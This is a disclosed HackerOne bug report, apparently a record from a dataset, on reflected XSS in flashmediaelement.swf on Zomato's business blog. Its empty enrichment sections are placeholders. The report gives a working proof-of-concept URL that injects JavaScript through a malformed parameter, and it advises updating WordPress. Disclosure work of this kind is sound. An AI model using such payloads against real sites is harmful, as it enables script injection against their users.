---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '200351'
original_report_id: '200351'
title: XSS in flashmediaelement.swf (business-blog.zomato.com)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zomato
created_at: '2017-01-22T14:31:56.345Z'
disclosed_at: '2017-06-17T17:59:54.492Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in flashmediaelement.swf (business-blog.zomato.com)

## Metadata

- HackerOne Report ID: 200351
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zomato
- Disclosed At: 2017-06-17T17:59:54.492Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello __Team__

__Description__:-
 business-blog.zomato.com is vulnerable to reflected XSS that stems from an insecure URL sanitization process performed in the file flashmediaelement.swf

__POC__:-
https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?%#jsinitfunctio%gn=alert%60xss by dem0n%60

{F154224}

__Fix__:-

Update to WordPress to latest

__Regards__:-
Santhosh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
